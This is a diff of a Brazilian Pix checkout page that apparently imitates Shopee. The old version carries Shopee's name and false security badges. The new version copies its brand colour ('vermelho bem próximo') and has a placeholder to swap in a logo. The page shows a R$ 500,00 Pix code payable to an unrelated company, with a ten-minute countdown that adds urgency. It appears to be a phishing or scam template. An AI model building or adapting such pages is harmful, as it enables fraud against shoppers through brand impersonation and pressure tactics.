@@ -1,231 +1,228 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <title>Shopee - Pagamento Seguro</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8">
+<title>Pagamento Pix</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <style>
-        * {
-            box-sizing: border-box;
-            font-family: Arial, Helvetica, sans-serif;
-        }
+<style>
+/* ===== CORES (AJUSTÁVEIS) ===== */
+:root{
+    --vermelho:#ee4d2d;        /* vermelho bem próximo */
+    --vermelho-escuro:#d63f25;
+    --cinza:#777;
+    --borda:#e5e5e5;
+}
 
-        body {
-            margin: 0;
-            background-color: #0d1117;
-            color: #c9d1d9;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 15px;
-        }
+/* ===== RESET ===== */
+*{
+    box-sizing:border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
 
-        .container {
-            background-color: #161b22;
-            width: 100%;
-            max-width: 480px;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 0 30px rgba(0,0,0,0.5);
-        }
+body{
+    margin:0;
+    background:#ffffff; /* FUNDO TOTALMENTE BRANCO */
+    color:#333;
+}
 
-        .logo {
-            text-align: center;
-            margin-bottom: 10px;
-        }
+/* ===== TOPO ===== */
+.header{
+    background:linear-gradient(90deg,var(--vermelho),#ff6a3a);
+    padding:14px 16px;
+    display:flex;
+    align-items:center;
+}
 
-        .logo img {
-            max-width: 110px;
-            width: 100%;
-        }
+.header img{
+    height:28px;
+}
 
-        h1 {
-            text-align: center;
-            font-size: 22px;
-            margin-bottom: 5px;
-        }
+/* ===== CONTAINER ===== */
+.container{
+    max-width:420px;
+    margin:18px auto;
+    padding:16px;
+}
 
-        .secure {
-            text-align: center;
-            font-size: 14px;
-            color: #3fb950;
-            margin-bottom: 15px;
-        }
+/* ===== TÍTULOS ===== */
+.title{
+    font-size:16px;
+    margin-bottom:12px;
+}
 
-        .timer-box {
-            background-color: #010409;
-            padding: 12px;
-            border-radius: 8px;
-            text-align: center;
-            margin-bottom: 15px;
-            border: 1px solid #238636;
-        }
+/* ===== VALOR ===== */
+.row{
+    display:flex;
+    justify-content:space-between;
+    font-size:14px;
+    padding:6px 0;
+}
 
-        .timer {
-            font-size: 22px;
-            font-weight: bold;
-            color: #f85149;
-        }
+.row strong{
+    color:var(--vermelho);
+}
 
-        .info {
-            background-color: #0d1117;
-            padding: 12px;
-            border-radius: 6px;
-            font-size: 14px;
-            margin-bottom: 15px;
-            border-left: 4px solid #238636;
-        }
+/* ===== TEMPO ===== */
+.timer{
+    font-size:13px;
+    color:var(--vermelho);
+    margin:10px 0 16px;
+}
 
-        pre {
-            background-color: #010409;
-            padding: 15px;
-            border-radius: 6px;
-            overflow-x: auto;
-            font-size: 14px;
-            margin-bottom: 15px;
-        }
+/* ===== PIX ===== */
+.pix-box{
+    text-align:center;
+    border-top:1px solid var(--borda);
+    border-bottom:1px solid var(--borda);
+    padding:18px 0;
+}
 
-        button {
-            width: 100%;
-            padding: 14px;
-            background-color: #238636;
-            border: none;
-            border-radius: 6px;
-            color: #ffffff;
-            font-size: 16px;
-            cursor: pointer;
-        }
+.pix-box img{
+    width:220px;
+    max-width:100%;
+    margin:12px 0;
+}
 
-        button:disabled {
-            background-color: #30363d;
-            cursor: not-allowed;
-        }
+/* ===== BOTÕES ===== */
+button{
+    width:100%;
+    padding:11px;
+    border-radius:4px;
+    border:1px solid var(--vermelho);
+    background:#fff;
+    color:var(--vermelho);
+    font-size:14px;
+    cursor:pointer;
+}
 
-        .mensagem {
-            text-align: center;
-            margin-top: 12px;
-            font-size: 14px;
-            color: #3fb950;
-        }
+button:hover{
+    background:var(--vermelho);
+    color:#fff;
+}
 
-        .expired {
-            text-align: center;
-            color: #f85149;
-            font-size: 16px;
-            font-weight: bold;
-            margin-top: 15px;
-        }
+button.primary{
+    background:var(--vermelho);
+    color:#fff;
+    border:none;
+}
 
-        .footer {
-            text-align: center;
-            font-size: 12px;
-            color: #8b949e;
-            margin-top: 20px;
-        }
+button.primary:hover{
+    background:var(--vermelho-escuro);
+}
 
-        @media (max-width: 480px) {
-            h1 {
-                font-size: 20px;
-            }
+button:disabled{
+    background:#eee;
+    color:#999;
+    border:1px solid #ddd;
+    cursor:not-allowed;
+}
 
-            .timer {
-                font-size: 20px;
-            }
-        }
-    </style>
+/* ===== LISTA ===== */
+.instructions{
+    font-size:13px;
+    margin:16px 0;
+    padding-left:18px;
+}
+
+.instructions li{
+    margin-bottom:6px;
+}
+
+/* ===== EXPIRADO ===== */
+.expired{
+    text-align:center;
+    color:#d32f2f;
+    font-weight:bold;
+    margin-top:14px;
+    display:none;
+}
+
+/* ===== MOBILE ===== */
+@media(max-width:480px){
+    .container{padding:12px}
+}
+</style>
 </head>
+
 <body>
+
+<!-- TOPO / LOGO -->
+<div class="header">
+    <!-- TROQUE A LOGO -->
+    <img src="logo.png" alt="Logo">
+</div>
 
 <div class="container">
 
-    <!-- LOGO (ALTERE A URL) -->
-    <div class="logo">
-        <img src="logo.png">
+    <div class="title">Pagamento</div>
+
+    <div class="row">
+        <span>Pagamento Total</span>
+        <strong>R$ 500,00</strong>
     </div>
 
-    <!-- NOME DA LOJA -->
-    <h1>Shopee Pagamentos</h1>
-
-    <div class="secure">
-        🔒 Pagamento protegido • Ambiente seguro
+    <div class="timer">
+        Pagar em até <strong><span id="tempo">10:00</span></strong>
     </div>
 
-    <!-- CONTADOR -->
-    <div class="timer-box">
-        Finalize o pagamento em:<br>
-        <span class="timer" id="timer">10:00</span>
+    <div class="pix-box">
+        <div><strong>Pix</strong></div>
+
+        <!-- QR CODE -->
+        <img src="qrcode.png" alt="QR Code Pix">
+
+        <!-- CÓDIGO PIX -->
+        <pre id="codigo" style="display:none;">00020101021226790014br.gov.bcb.pix2557qrcode.mwbank.com.br/cob/699e2f24791f4a7c8010892526e843035204000053039865802BR5916IVI GATEWAY LTDA6009JOINVILLE62070503***63047A09</pre>
+
+        <button id="copiar">Copiar código Pix</button>
     </div>
 
-    <!-- INFORMAÇÕES DE CONFIANÇA -->
-    <div class="info">
-        ✔ Conexão criptografada (HTTPS)<br>
-        ✔ Nenhum dado pessoal armazenado<br>
-        ✔ Código válido por tempo limitado
-    </div>
+    <ul class="instructions">
+        <li>Acesse o aplicativo do seu banco.</li>
+        <li>Escolha pagar via Pix.</li>
+        <li>Escaneie o QR Code ou cole o código.</li>
+        <li>O pagamento será confirmado em instantes.</li>
+    </ul>
 
-    <!-- CÓDIGO -->
-    <pre id="codigo">
-00020101021226790014br.gov.bcb.pix2557qrcode.mwbank.com.br/cob/699e2f24791f4a7c8010892526e843035204000053039865802BR5916IVI GATEWAY LTDA6009JOINVILLE62070503***63047A09
-    </pre>
+    <button class="primary">OK</button>
 
-    <!-- BOTÃO -->
-    <button id="btnCopiar">Copiar Código</button>
-
-    <div class="mensagem" id="mensagem"></div>
-    <div class="expired" id="expired" style="display:none;">
-        ⛔ Tempo expirado. Gere um novo código para continuar.
-    </div>
-
-    <div class="footer">
-        Sistema automático • Acesso temporário • Monitoramento ativo
+    <div id="expirado" class="expired">
+        Tempo expirado. Gere um novo pagamento.
     </div>
 
 </div>
 
 <script>
-    const tempoInicial = 10 * 60; // 10 minutos em segundos
-    let tempoRestante = tempoInicial;
+/* ===== CONTADOR 10 MINUTOS ===== */
+let tempo = 600;
+const elTempo = document.getElementById("tempo");
+const btnCopiar = document.getElementById("copiar");
+const expirado = document.getElementById("expirado");
+const codigo = document.getElementById("codigo");
 
-    const timerEl = document.getElementById("timer");
-    const btnCopiar = document.getElementById("btnCopiar");
-    const mensagem = document.getElementById("mensagem");
-    const expired = document.getElementById("expired");
-    const codigoEl = document.getElementById("codigo");
+const intervalo = setInterval(()=>{
+    const m = Math.floor(tempo/60);
+    const s = tempo%60;
 
-    function atualizarTimer() {
-        const minutos = Math.floor(tempoRestante / 60);
-        const segundos = tempoRestante % 60;
+    elTempo.textContent =
+        String(m).padStart(2,"0")+":"+
+        String(s).padStart(2,"0");
 
-        timerEl.textContent =
-            String(minutos).padStart(2, "0") + ":" +
-            String(segundos).padStart(2, "0");
-
-        if (tempoRestante <= 0) {
-            clearInterval(intervalo);
-            btnCopiar.disabled = true;
-            codigoEl.textContent = "CÓDIGO EXPIRADO";
-            expired.style.display = "block";
-            mensagem.textContent = "";
-        }
-
-        tempoRestante--;
+    if(tempo <= 0){
+        clearInterval(intervalo);
+        btnCopiar.disabled = true;
+        expirado.style.display = "block";
     }
 
-    const intervalo = setInterval(atualizarTimer, 1000);
+    tempo--;
+},1000);
 
-    btnCopiar.addEventListener("click", function () {
-        if (tempoRestante > 0) {
-            navigator.clipboard.writeText(codigoEl.innerText.trim())
-                .then(() => {
-                    mensagem.textContent = "Código copiado com sucesso!";
-                })
-                .catch(() => {
-                    mensagem.textContent = "Erro ao copiar o código.";
-                });
-        }
-    });
+/* ===== COPIAR PIX ===== */
+btnCopiar.onclick = () => {
+    navigator.clipboard.writeText(codigo.textContent.trim());
+    btnCopiar.textContent = "Código copiado";
+};
 </script>
 
 </body>
